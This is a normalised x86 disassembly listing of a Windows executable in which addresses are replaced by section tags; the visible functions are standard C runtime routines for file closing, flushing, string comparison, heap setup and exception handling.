cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405be1
push 0x16
pop esi
mov [ eax ] esi
call sub_40571b
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_405be1
mov [ eax ] 0x2a
call sub_405be1
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_405be1
push 0x22
pop esi
mov [ eax ] esi
call sub_40571b
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_407580
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_407580
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40b496
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40afe7
push esi
mov edi eax
call sub_40b7e4
push esi
call sub_409071
push eax
call sub_40b720
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_404a59
and [ esi + 0x1c ] 0x0
pop ecx
sub_40b503
push 0xc
push r--data
call sub_405df0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
jmp r-xdata
push esi
call sub_408f93
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40b496
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b56f
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_405e35
retn
mov eax [ ebp - 0x1c ]
sub_40b577
push 0x10
push r--data
call sub_405df0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_405e35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ae16
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40adad
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b648
mov eax [ ebp - 0x1c ]
call sub_405bf4
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_40b650
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40b684
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40adad
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_405c07
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40adad
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40adad
push 0x1
mov edi eax
call sub_40adad
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40ad27
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40b720
push 0x10
push r--data
call sub_405df0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_405e35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ae16
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40b684
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b7dc
mov eax [ ebp - 0x1c ]
sub_40b7e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404a59
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40b820
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40b870
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40b8b0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_401293
mov eax [ fs : 0x18 ]
mov eax [ eax + 0xf70 ]
mov eax [ eax + 0x60 ]
mov eax [ eax + 0xf8 ]
retn
sub_403087
mov eax [ fs : 0x30 ]
retn
sub_403115
push rw-data
call sub_402850
pop eax
retn
sub_404654
mov [ ecx ] r--data
jmp sub_404ecf
sub_404686
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_404f01
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40474e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404723
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_404766
push 0x8
call sub_4052f1
pop ecx
retn
sub_40476f
push 0x8
call sub_405218
pop ecx
retn
sub_404991
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_405218
pop ecx
sub_4049a6
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_404866
add esp 0xc
pop ebp
retn
sub_4049bc
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_404866
add esp 0xc
pop ebp
retn
sub_4049d2
push 0x1
push 0x0
push 0x0
call sub_404866
add esp 0xc
retn
sub_4049e1
push 0x1
push 0x1
push 0x0
call sub_404866
add esp 0xc
retn
sub_404a0e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404a59
sub_404a93
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_406006
push 0x1
push 0x0
call sub_4062c1
add esp 0xc
jmp sub_40628e
call eax
sub_404abd
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_4062e2
pop ecx
retn
sub_404cc4
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_406792
pop ecx
pop ecx
retn
sub_404cd8
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4049e1
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_405e35
retn
push eax
call sub_4049bc
_start
call sub_406f48
jmp sub_404b95
sub_404e12
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_404e2f
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_404e7c
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_404a59
pop ecx
sub_404ecf
mov [ ecx ] r--data
jmp sub_404e7c
sub_405043
call sub_40476f
retn
sub_405049
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40500d
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4050f4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405218
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4052e8
push 0xa
call sub_405218
pop ecx
retn
sub_405324
push 0x8
push r--data
call sub_405df0
call sub_4058db
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40628e
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_405344
xor eax eax
inc eax
retn
sub_40535d
push sub_405324
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_40536e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_4053c3
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_405537
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_405218
pop ecx
sub_405573
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405582
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405591
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40572b
push 0x0
call [ EncodePointer@IAT ]
retn
sub_405734
call [ TlsAlloc@IAT ]
retn 0x4
sub_405850
push 0xd
call sub_405218
pop ecx
retn
sub_405859
push 0xc
call sub_405218
pop ecx
retn
sub_405a0f
push 0xd
call sub_405218
pop ecx
retn
sub_405a1b
push 0xc
call sub_405218
pop ecx
retn
sub_405dbb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_405e35
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_406270
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_406349
push 0xe
call sub_405218
pop ecx
retn
sub_406784
push sub_406742
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_406fe3
and [ rw-data ] 0x0
retn
sub_407927
push 0xc
call sub_405218
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_407bf1
push 0xd
call sub_405218
pop ecx
retn
sub_407fc0
push 0xd
call sub_405218
pop ecx
retn
sub_407ff9
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_407e5f
pop ecx
mov [ rw-data ] 0x1
sub_408017
push 0x2
call sub_4049f0
sub_4080f6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_408020
add esp 0xc
pop ebp
retn 0x4
sub_408129
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40ad05
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40815b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_408020
add esp 0xc
pop ebp
retn 0x8
sub_408642
push [ ebp + 0x8 ]
call sub_40aeb5
pop ecx
retn
sub_408e15
push ebx
call sub_40aeb5
pop ecx
retn
sub_408f73
call sub_40b171
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_404a59
pop ecx
retn
call sub_40af4b
sub_40921e
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_40934a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409234
add esp 0x10
pop ebp
retn
sub_40939c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_409364
pop ecx
pop ecx
pop ebp
retn
sub_40a0f4
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40a0a1
add esp 0x10
pop ebp
retn
sub_40a2bc
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40a2e6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40af20
sub_40acd9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40ac10
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40ad24
call eax
retn
sub_40aeac
push 0xa
call sub_405218
pop ecx
retn
sub_40afde
push 0x1
call sub_405218
pop ecx
retn
sub_40b139
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_409042
pop ecx
pop ecx
retn
sub_40b168
push 0x1
call sub_405218
pop ecx
retn
sub_40b171
push 0x1
call sub_40b097
pop ecx
retn
sub_40b443
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b2ee
add esp 0x14
pop ebp
retn
sub_40b460
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40b47f
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40b56f
push esi
call sub_409006
pop ecx
retn
sub_40b648
push ebx
call sub_40aeb5
pop ecx
retn
sub_40b7dc
push ebx
call sub_40aeb5
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40b918
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_404ecf
